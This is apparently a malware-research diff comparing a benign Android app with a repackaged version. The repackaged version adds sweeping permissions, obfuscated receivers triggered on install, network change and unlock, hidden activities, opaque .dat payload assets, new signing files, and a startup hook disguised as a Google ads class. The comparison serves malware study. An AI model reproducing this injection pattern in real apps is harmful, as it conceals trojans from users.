@@ -1,0 +1,442 @@
+diff -r result/APP_14/App_B_14/AndroidManifest.xml result/APP_14/App_M_14/AndroidManifest.xml
+7d6
+<     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+8a8,15
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+57a65,124
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.cwillay.MaveActivity" android:screenOrientation="portrait">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+>             </intent-filter>
+>         </activity>
+>         <service android:name="com.cwillay.WiwslRwsn"/>
+>         <receiver android:name="com.cwillay.FwaunActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:name="com.cwillay.tusrck.LuwnActivity"/>
+>         <receiver android:name="com.cwillay.tusrck.BwoienAwinl">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.cwillay.coarn.TawnActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+>             </intent-filter>
+>         </activity>
+>         <service android:name="com.cwillay.coarn.SwsueActivity"/>
+>         <receiver android:name="com.cwillay.coarn.NatuIwin">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:excludeFromRecents="true" android:launchMode="singleTask" android:name="com.cwillay.niwin.UweAHawnw"/>
+>         <service android:name="com.cwillay.niwin.GeunAwneui"/>
+>         <receiver android:name="com.cwillay.niwin.RTawsnActivity">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+diff -r result/APP_14/App_B_14/apktool.yml result/APP_14/App_M_14/apktool.yml
+2c2
+< apkFileName: Bapp14-1E80E7B224D79E74A3EAB0EC03CE4177A8D2E837DACE394FEAFAF18150009713.apk
+---
+> apkFileName: Mapp14-4B146AA4FD45E2491A93C4B48801EC147BA0A5ED2AF7ABEE9C2F58BC798C5EC1.apk
+6,60c6,47
+< - assets/data/a0
+< - assets/data/a1
+< - assets/data/a10
+< - assets/data/a100
+< - assets/data/a101
+< - assets/data/a102
+< - assets/data/a103
+< - assets/data/a104
+< - assets/data/a105
+< - assets/data/a106
+< - assets/data/a107
+< - assets/data/a108
+< - assets/data/a109
+< - assets/data/a11
+< - assets/data/a110
+< - assets/data/a111
+< - assets/data/a112
+< - assets/data/a113
+< - assets/data/a114
+< - assets/data/a117
+< - assets/data/a118
+< - assets/data/a119
+< - assets/data/a12
+< - assets/data/a120
+< - assets/data/a121
+< - assets/data/a122
+< - assets/data/a123
+< - assets/data/a124
+< - assets/data/a125
+< - assets/data/a126
+< - assets/data/a127
+< - assets/data/a128
+< - assets/data/a129
+< - assets/data/a13
+< - assets/data/a130
+< - assets/data/a131
+< - assets/data/a132
+< - assets/data/a133
+< - assets/data/a134
+< - assets/data/a135
+< - assets/data/a136
+< - assets/data/a137
+< - assets/data/a138
+< - assets/data/a14
+< - assets/data/a140
+< - assets/data/a141
+< - assets/data/a142
+< - assets/data/a143
+< - assets/data/a144
+< - assets/data/a145
+< - assets/data/a146
+< - assets/data/a147
+< - assets/data/a148
+< - assets/data/a149
+< - assets/data/a15
+---
+> - assets/data/a72
+> - assets/data/a71
+> - assets/data/a70
+> - assets/data/a76
+> - assets/data/a75
+> - assets/data/a74
+> - assets/data/a73
+> - assets/data/a79
+> - assets/data/a78
+> - assets/data/a77
+> - ogg
+> - assets/data/a61
+> - assets/data/a60
+> - assets/data/a63
+> - assets/data/a62
+> - assets/data/a65
+> - assets/data/a64
+> - assets/data/a67
+> - assets/data/a66
+> - assets/data/a69
+> - assets/data/a68
+> - assets/data/a98
+> - assets/data/a97
+> - assets/data/a96
+> - assets/data/a95
+> - assets/data/a94
+> - assets/data/a93
+> - assets/data/a92
+> - assets/data/a91
+> - assets/data/a170
+> - assets/data/a99
+> - assets/data/a90
+> - assets/data/a85
+> - assets/data/a84
+> - assets/data/a87
+> - assets/data/a86
+> - assets/data/a81
+> - assets/data/a80
+> - assets/data/a83
+> - assets/data/a82
+> - assets/data/a89
+> - assets/data/a88
+71d57
+< - assets/data/a16
+73,74d58
+< - assets/data/a161
+< - assets/data/a162
+77,78c61,62
+< - assets/data/a165
+< - assets/data/a166
+---
+> - assets/data/a161
+> - assets/data/a162
+80a65,66
+> - assets/data/a165
+> - assets/data/a166
+82,83c68,106
+< - assets/data/a17
+< - assets/data/a170
+---
+> - assets/data/a130
+> - assets/data/a131
+> - assets/data/a136
+> - assets/data/a137
+> - assets/data/a138
+> - assets/data/a132
+> - assets/data/a133
+> - assets/data/a134
+> - assets/data/a135
+> - assets/data/a141
+> - assets/data/a142
+> - assets/data/a140
+> - assets/data/a149
+> - assets/data/a147
+> - assets/data/a148
+> - assets/data/a145
+> - assets/data/a146
+> - assets/data/a143
+> - assets/data/a144
+> - assets/data/a126
+> - assets/data/a125
+> - assets/data/a128
+> - assets/data/a127
+> - assets/data/a122
+> - assets/data/a121
+> - assets/data/a124
+> - assets/data/a123
+> - assets/data/a120
+> - assets/data/a129
+> - assets/data/a117
+> - assets/data/a12
+> - assets/data/a11
+> - assets/data/a14
+> - assets/data/a114
+> - assets/data/a13
+> - assets/data/a16
+> - assets/data/a113
+> - assets/data/a15
+> - assets/data/a112
+84a108,111
+> - assets/data/a111
+> - assets/data/a17
+> - assets/data/a110
+> - assets/data/a10
+86,110c113,124
+< - assets/data/a2
+< - assets/data/a20
+< - assets/data/a21
+< - assets/data/a22
+< - assets/data/a23
+< - assets/data/a24
+< - assets/data/a25
+< - assets/data/a26
+< - assets/data/a27
+< - assets/data/a28
+< - assets/data/a29
+< - assets/data/a3
+< - assets/data/a30
+< - assets/data/a31
+< - assets/data/a32
+< - assets/data/a33
+< - assets/data/a34
+< - assets/data/a35
+< - assets/data/a36
+< - assets/data/a37
+< - assets/data/a38
+< - assets/data/a39
+< - assets/data/a4
+< - assets/data/a40
+< - assets/data/a41
+---
+> - assets/data/a118
+> - assets/data/a119
+> - assets/data/a100
+> - assets/data/a102
+> - assets/data/a101
+> - assets/data/a104
+> - assets/data/a103
+> - assets/data/a106
+> - assets/data/a105
+> - assets/data/a107
+> - assets/data/a108
+> - assets/data/a109
+113,114c127,128
+< - assets/data/a44
+< - assets/data/a45
+---
+> - assets/data/a40
+> - assets/data/a41
+116a131,132
+> - assets/data/a44
+> - assets/data/a45
+119d134
+< - assets/data/a5
+125a141
+> - assets/data/a9
+126a143
+> - assets/data/a8
+129a147,152
+> - assets/data/a0
+> - assets/data/a1
+> - assets/data/a2
+> - assets/data/a3
+> - assets/data/a4
+> - assets/data/a5
+131,140d153
+< - assets/data/a60
+< - assets/data/a61
+< - assets/data/a62
+< - assets/data/a63
+< - assets/data/a64
+< - assets/data/a65
+< - assets/data/a66
+< - assets/data/a67
+< - assets/data/a68
+< - assets/data/a69
+142,174c155,174
+< - assets/data/a70
+< - assets/data/a71
+< - assets/data/a72
+< - assets/data/a73
+< - assets/data/a74
+< - assets/data/a75
+< - assets/data/a76
+< - assets/data/a77
+< - assets/data/a78
+< - assets/data/a79
+< - assets/data/a8
+< - assets/data/a80
+< - assets/data/a81
+< - assets/data/a82
+< - assets/data/a83
+< - assets/data/a84
+< - assets/data/a85
+< - assets/data/a86
+< - assets/data/a87
+< - assets/data/a88
+< - assets/data/a89
+< - assets/data/a9
+< - assets/data/a90
+< - assets/data/a91
+< - assets/data/a92
+< - assets/data/a93
+< - assets/data/a94
+< - assets/data/a95
+< - assets/data/a96
+< - assets/data/a97
+< - assets/data/a98
+< - assets/data/a99
+< - ogg
+---
+> - assets/data/a20
+> - assets/data/a21
+> - assets/data/a28
+> - assets/data/a29
+> - assets/data/a26
+> - assets/data/a27
+> - assets/data/a24
+> - assets/data/a25
+> - assets/data/a22
+> - assets/data/a23
+> - assets/data/a30
+> - assets/data/a31
+> - assets/data/a32
+> - assets/data/a37
+> - assets/data/a38
+> - assets/data/a39
+> - assets/data/a33
+> - assets/data/a34
+> - assets/data/a35
+> - assets/data/a36
+185,187c185
+< unknownFiles:
+<   build.properties: '8'
+<   version.properties: '8'
+---
+> unknownFiles: {}
+Somente em result/APP_14/App_M_14/assets: bin
+Somente em result/APP_14/App_M_14/assets: l
+Somente em result/APP_14/App_M_14/assets: lc
+Somente em result/APP_14/App_M_14/assets: waoin
+Somente em result/APP_14/App_M_14/com: cwillay
+Somente em result/APP_14/App_M_14/com: google
+diff -r result/APP_14/App_B_14/hll/kxyfyh/act/DefaultActivity.java result/APP_14/App_M_14/hll/kxyfyh/act/DefaultActivity.java
+6a7
+> import com.google.ads.AdsTwinActivity;
+15a17
+>     AdsTwinActivity.init(this);
+Os arquivos binários result/APP_14/App_B_14/original/AndroidManifest.xml e result/APP_14/App_M_14/original/AndroidManifest.xml são diferentes
+Somente em result/APP_14/App_M_14/original/META-INF: CERT.RSA
+Somente em result/APP_14/App_M_14/original/META-INF: CERT.SF
+diff -r result/APP_14/App_B_14/original/META-INF/MANIFEST.MF result/APP_14/App_M_14/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.6.0_51 (Apple Inc.)
+---
+> Created-By: 1.0 (Android SignApk)
+237a238,240
+> Name: assets/lc/wonwal.dat
+> SHA1-Digest: 134LjZUgs0Idp5LoC1K+/hEnotI=
+> 
+244,246d246
+< Name: build.properties
+< SHA1-Digest: 4s3hn+IS4zUQSXhC5OiMf5lt4sQ=
+< 
+255a256,258
+> Name: assets/l/l.dat
+> SHA1-Digest: iS+a8wBOFUjZSg1Zuqs0GC6Vnrk=
+> 
+331,332c334,335
+< Name: version.properties
+< SHA1-Digest: e2uiEU1PSrExxqrqpBqUA2V6/o4=
+---
+> Name: assets/data/a117
+> SHA1-Digest: DIwBLKrrHUQwN7ke9EnbuRoFyjw=
+337,339d339
+< Name: assets/data/a117
+< SHA1-Digest: DIwBLKrrHUQwN7ke9EnbuRoFyjw=
+< 
+437c437
+< SHA1-Digest: CGGrKj7EPZ757cqtNcn28STKL/I=
+---
+> SHA1-Digest: uqAl9Z0SPmf7qJBSuvugofJJ8Gk=
+440c440
+< SHA1-Digest: IXzfhYtgUwLjiv3o673p8d68/Cs=
+---
+> SHA1-Digest: OuU1sh51bWPqeq6EKQ20n0ZVEwI=
+450a451,453
+> Name: assets/bin/v.dat
+> SHA1-Digest: LXEhYxaejpe00tXqHic1Q2YvB9Q=
+> 
+455c458
+< SHA1-Digest: ywrLtEn3RJAKEsCBMmvNGM3t8qA=
+---
+> SHA1-Digest: cloFgRREC9TY4d+IYYnp5kYAqyk=
+599a603,605
+> 
+> Name: assets/waoin/pic.dat
+> SHA1-Digest: hZm7d/Jx5BPdDqPbDwtXCSeWJL4=
+Somente em result/APP_14/App_B_14/original/META-INF: PLAYPHON.RSA
+Somente em result/APP_14/App_B_14/original/META-INF: PLAYPHON.SF
+Somente em result/APP_14/App_M_14/smali/com: cwillay
+Somente em result/APP_14/App_M_14/smali/com: google
+diff -r result/APP_14/App_B_14/smali/hll/kxyfyh/act/DefaultActivity.smali result/APP_14/App_M_14/smali/hll/kxyfyh/act/DefaultActivity.smali
+20a21,22
+>     invoke-static {p0}, Lcom/google/ads/AdsTwinActivity;->init(Landroid/content/Context;)V
+> 
+Somente em result/APP_14/App_B_14/: unknown
